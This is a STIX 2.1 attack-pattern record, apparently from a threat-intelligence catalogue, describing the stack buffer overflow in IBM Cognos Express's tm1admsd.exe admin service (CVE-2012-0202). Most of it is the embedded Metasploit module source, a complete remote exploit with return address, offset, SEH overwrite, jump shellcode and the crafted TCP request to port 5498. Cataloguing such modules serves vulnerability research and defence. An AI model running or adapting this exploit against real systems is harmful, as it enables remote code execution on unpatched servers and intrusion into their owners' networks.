{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5bad5a3d-6479-4a81-87b2-39eea67f6cd1",
    "created": "2024-08-14T16:45:46.622388Z",
    "modified": "2024-08-14T16:45:46.622391Z",
    "name": "IBM Cognos tm1admsd.exe Overflow",
    "description": " This module exploits a stack buffer overflow in IBM Cognos Analytic Server Admin service. The vulnerability exists in the tm1admsd.exe component, due to a dangerous copy of user controlled data to the stack, via memcpy, without validating the supplied length and data. The module has been tested successfully on IBM Cognos Express 9.5 over Windows XP SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ibm_cognos_tm1admsd_bof.rb",
            "external_id": "ibm_cognos_tm1admsd_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0202"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21590314"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM Cognos tm1admsd.exe Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in IBM Cognos Analytic Server\n        Admin service. The vulnerability exists in the tm1admsd.exe component, due to a\n        dangerous copy of user controlled data to the stack, via memcpy, without validating\n        the supplied length and data. The module has been tested successfully on IBM Cognos\n        Express 9.5 over Windows XP SP3.\n      },\n      'Author'         =>\n        [\n          'Unknown', # Original discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2012-0202'],\n          ['OSVDB', '80876'],\n          ['BID', '52847'],\n          ['ZDI', '12-101'],\n          ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21590314']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'SSL' => true,\n        },\n      'Payload'        =>\n        {\n          'Space'    => 10359,\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'DefaultTarget'  => 0,\n      'Targets'        =>\n        [\n          # tm1admsd.exe 9.5.10009.10070\n          # ret from unicode.nls # call dword ptr ss:[ebp+0x30] # tested over Windows XP SP3 updates\n          [ 'IBM Cognos Express 9.5 / Windows XP SP3', { 'Ret' => 0x00280b0b, 'Offset' => 10359 } ]\n        ],\n      'DisclosureDate' => '2012-04-02'))\n\n      register_options([Opt::RPORT(5498)])\n  end\n\n  def exploit\n\n    sploit = payload.encoded\n    sploit << rand_text(target['Offset'] - sploit.length)\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{target['Offset']}\").encode_string\n    sploit << \"\\xEB\\xF9\" + rand_text(2) # jmp $-5\n    sploit << [target.ret].pack(\"V\") # seh\n    sploit << rand_text(2000) # Trigger exception\n\n    data = rand_text(4)\n    data << \"\\x00\\x08\" # Opcode\n    data << [sploit.length].pack(\"n\") # Length\n    data << sploit # Value\n\n    length = [data.length + 2].pack(\"n\")\n\n    req = length\n    req << data\n\n    connect\n    sock.put(req)\n    disconnect\n\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2012-04-02",
    "x_mitre_platforms": [
        "win'"
    ]
}